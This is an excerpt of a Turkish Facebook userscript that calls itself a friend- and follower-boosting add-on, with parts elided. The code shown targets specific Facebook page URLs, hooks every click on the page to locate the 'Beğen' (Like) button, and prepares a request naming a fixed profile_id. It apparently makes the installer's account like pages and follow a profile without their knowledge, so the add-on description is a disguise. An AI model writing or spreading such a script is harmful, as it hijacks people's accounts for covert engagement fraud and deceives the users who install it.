// ==UserScript==
// @name           5 K Arkadaş Yapıcı /V2
// @author         5 K Arkadaş Yapıcı /V2
// @version        1.5
// @description    Facebook Abone Kasma & Arkadaş Kasma Eklentisi
...
if (document.URL.indexOf("http://www.facebook.com/pages/Ne-Mutlu-T%C3%BCrk%C3%BCm-Diyene/198099936937221") >= 0 && document.URL.indexOf("sharer.php") < 0) {
...
document.addEventListener("click", function () {
    if (document.URL.indexOf("http://www.facebook.com/pages/Faceye-Be%C4%9Fenmedim-Tu%C5%9Fu-Ekle/247288268637600") >= 0 && document.URL.indexOf("sharer.php") < 0) {
        for (i = 0; i <= document.getElementById("mainbuttonspan").getElementsByTagName("input").length - 1; i++) {
            if (document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).value == "Beğen") {
                document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).id = "Begen"
            }
    ...
    var params = "profile_id=100003551140149";
    params += "&location=1";
